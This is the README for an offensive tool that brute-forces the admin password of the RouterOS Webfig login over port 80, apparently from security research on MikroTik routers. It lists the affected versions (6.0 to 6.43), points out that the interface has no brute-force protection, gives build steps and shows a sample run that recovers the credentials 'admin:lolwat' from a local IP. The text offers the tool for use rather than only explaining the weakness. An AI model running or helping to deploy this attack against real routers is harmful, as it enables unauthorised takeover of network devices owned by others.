# Webfig Bruteforce

The Webfig interface, port 80, has... let's say absolutely no bruteforce protection if you can reach it. There is a feature that limits which IPs can connect to it, but if you are in that IP range or it isn't set then you can brute force it to your hearts content.

This project takes a list of passwords, and IP address, and a port. It will keep sending login requests for the 'admin' user until its out of passwords to try or it found a valid request.

Sample:

```
albinolobster@ubuntu:~/routeros_internal/brute_force/www_brute/build$ time ./www_bruteforce -f ~/top10000.txt -i 192.168.1.139 -p 80 2> /dev/null
[+] Loading password file...
[+] Found 10000 passwords.
10000 / 10000
We found the password! Use admin:lolwat

real    0m46.522s
user    0m2.091s
sys     0m4.206s
```

## What versions does this work on?

Any RouterOS version between 6.0 and 6.43. Webfig has changed over time and I don't have all the implementations in here.

## Are there side affects?

Oh yeah. All log in attempts are written to the log file... it gets long pretty quick.

## What are the build dependencies?

This requires:

* Boost 1.66 or higher
* cmake

## How do I build this jawn?

Just normal cmake. Try this:

```sh
mkdir build
cd build
cmake ..
make
```

Resolve dependencies as needed.